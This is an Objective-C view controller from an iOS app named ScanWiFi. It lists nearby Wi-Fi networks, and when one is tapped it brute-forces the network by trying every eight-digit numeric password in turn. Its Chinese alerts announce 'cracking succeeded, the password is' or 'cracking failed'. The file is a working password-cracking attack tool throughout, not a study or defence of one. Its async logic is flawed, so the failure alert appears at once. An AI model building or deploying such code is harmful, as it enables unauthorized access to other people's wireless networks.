//
//  CBViewController.m
//  ScanWiFi
//
//  Created by 时代合盛 on 14-7-8.
//  Copyright (c) 2014年 时代合盛. All rights reserved.
//

#import "CBViewController.h"
#import "SOLStumbler.h"
#import "MBProgressHUD.h"
@interface CBViewController ()<UITableViewDataSource,UITableViewDelegate>

@property (nonatomic,strong)NSMutableArray *array;
@property (nonatomic,strong)SOLStumbler *stumbler;
@end

@implementation CBViewController

- (void)viewDidLoad
{
    [super viewDidLoad];
    
    self.array = [NSMutableArray array];
    UITableView *table = [[UITableView alloc]initWithFrame:self.view.bounds style:UITableViewStylePlain];
    [self.view addSubview:table];
    table.dataSource = self;
    table.delegate = self;

    [MBProgressHUD showHUDAddedTo:self.view animated:YES];
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        // something
        self.stumbler = [[SOLStumbler alloc]init];
        [self.stumbler scanNetworks];
        for (id key in [self.stumbler getWiFiInfo]){
            [self.array addObject:[[self.stumbler getWiFiInfo] objectForKey: key]];
        }
        dispatch_async(dispatch_get_main_queue(), ^{
            [MBProgressHUD hideAllHUDsForView:self.view animated:YES];
            [table reloadData];
        });
    });
    
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath{
    UITableViewCell *cell = [[UITableViewCell alloc]initWithStyle:UITableViewCellStyleDefault reuseIdentifier:nil];
    
    if(self.array.count>0){
        cell.textLabel.text = [[self.array objectAtIndex:indexPath.row]objectForKey:@"SSID_STR"];
    }
    return cell;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section{
    
    return self.array.count;
}

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath{
    
    [MBProgressHUD showHUDAddedTo:self.view animated:YES];
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        for(int i=0;i<=99999999;i++){
            NSString *pwd = [NSString stringWithFormat:@"%d",i];
            if(pwd.length<8){
                pwd = [self changeStr:pwd];
            }
            if([self.stumbler linkToNetwork:[self.array objectAtIndex:indexPath.row] withPassword:pwd] == 0){
                dispatch_async(dispatch_get_main_queue(), ^{
                    [MBProgressHUD hideAllHUDsForView:self.view animated:YES];;
                    UIAlertView *alert = [[UIAlertView alloc]initWithTitle:nil  message:[NSString stringWithFormat:@"破解成功,密码是:%d",i] delegate:self cancelButtonTitle:@"ok" otherButtonTitles:nil, nil];
                    [alert show];
                    return;
                });
            }
        }
    });
    [MBProgressHUD hideAllHUDsForView:self.view animated:YES];;
    UIAlertView *alert = [[UIAlertView alloc]initWithTitle:nil  message:@"破解失败,密码太复杂" delegate:self cancelButtonTitle:@"ok" otherButtonTitles:nil, nil];
    [alert show];

}
- (NSString *)changeStr:(NSString *)_str{
    NSString *str;
    switch (_str.length) {
        case 1:
            str = [NSString stringWithFormat:@"0000000%@",_str];
            break;
        case 2:
            str = [NSString stringWithFormat:@"000000%@",_str];
            break;
        case 3:
            str = [NSString stringWithFormat:@"00000%@",_str];
            break;
        case 4:
            str = [NSString stringWithFormat:@"0000%@",_str];
            break;
        case 5:
            str = [NSString stringWithFormat:@"000%@",_str];
            break;
        case 6:
            str = [NSString stringWithFormat:@"00%@",_str];
            break;
        case 7:
            str = [NSString stringWithFormat:@"0%@",_str];
            break;
    }
    return str;
}
- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

@end
